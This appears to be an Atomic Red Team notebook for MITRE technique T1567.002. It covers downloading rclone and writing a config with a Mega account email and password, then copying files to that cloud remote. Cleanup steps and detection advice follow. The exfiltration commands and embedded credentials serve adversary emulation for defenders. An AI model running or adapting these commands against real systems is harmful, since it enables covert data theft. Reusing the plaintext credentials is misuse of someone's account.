{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3d01b3ec",
   "metadata": {},
   "source": "# T1567.002 - Exfiltration to Cloud Storage\nAdversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. "
  },
  {
   "cell_type": "markdown",
   "id": "2b0cb1a9",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "56b3d5cc",
   "metadata": {},
   "source": "### Atomic Test #1 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)\nThis test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: rclone must exist at (#{rclone_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nExpand-archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\\" -force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a69c08b7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1567.002 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8d9cc9a2",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item $env:appdata\\rclone -ItemType directory\nNew-Item $env:appdata\\rclone\\rclone.conf\ncd \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\\"\n.\\rclone.exe config create T1567002 mega\nset-Content $env:appdata\\rclone\\rclone.conf \"[T1567002] `n type = mega `n user = atomictesting@outlook.com `n pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA\"\n.\\rclone.exe copy --max-size 1700k \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" T1567002:test -v\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4b4723fe",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1567.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "9a354575",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ncd \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\\"\n.\\rclone.exe purge T1567002:test\n.\\rclone.exe config delete T1567002:\nRemove-Item $env:appdata\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4ccac99c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1567.002 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6ca9c6c8",
   "metadata": {},
   "source": "## Detection\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}